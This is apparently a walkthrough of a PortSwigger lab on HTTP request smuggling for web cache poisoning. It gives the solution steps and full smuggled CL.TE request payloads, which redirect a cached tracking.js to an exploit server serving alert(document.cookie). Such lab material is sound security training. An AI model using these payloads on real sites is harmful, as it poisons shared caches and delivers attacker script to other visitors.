# Lab: Exploiting HTTP request smuggling to perform web cache poisoning

**Official lab:** [https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning](https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning)

## Lab idea

This exercise explores how a smuggled request can affect a shared cache and alter what later visitors receive for a JavaScript resource. It practices assessing the interaction between request-boundary flaws and cache poisoning.

## Vulnerability in brief
HTTP request smuggling (often called **HTTP desync**) is a vulnerability class in which components that process a sequence of HTTP requests disagree about where one request ends and the next begins. In a common deployment, a frontend proxy or load balancer forwards multiple user requests over a reused connection to a backend. If the two systems parse an ambiguous request differently, bytes treated as body by one may be read as the start of another request by the other. This can cause an attacker-controlled prefix to interfere with a later request.

## Solution idea
1. Open a blog post, click "Next post", and try smuggling the resulting request with a different Host header: POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type…
2. Observe that you can use this request to make the next request to the website get redirected to /post on a host of your choice.
3. Go to your exploit server, and create a text/javascript file at /post with the contents: alert(document.cookie)
4. Poison the server cache by first relaunching the previous attack using your exploit server's hostname as follows: POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type…
5. Then fetch /resources/js/tracking.js by sending the following request: GET /resources/js/tracking.js HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Connection: close If the attack has…
6. Confirm that the cache has been poisoned by repeating the request to tracking.js several times and confirming that you receive the redirect every time.

## Payloads / key values
- `POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 129 Transfer-Encoding: chunked 0 GET /post/next?postId=3 HTTP/1.1 Host: anything Content-Type: application/x-www-form-urlencoded Content-Length: 10 x=1`
- `/post`
- `text/javascript`
- `alert(document.cookie)`
- `POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 193 Transfer-Encoding: chunked 0 GET /post/next?postId=3 HTTP/1.1 Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net Content-Type: application/x-www-form-urlencoded Content-Length: 10 x=1`
- `/resources/js/tracking.js`
- `GET /resources/js/tracking.js HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Connection: close`
- `tracking.js`

## Official source
- [PortSwigger Academy: Lab: Exploiting HTTP request smuggling to perform web cache poisoning](https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning)
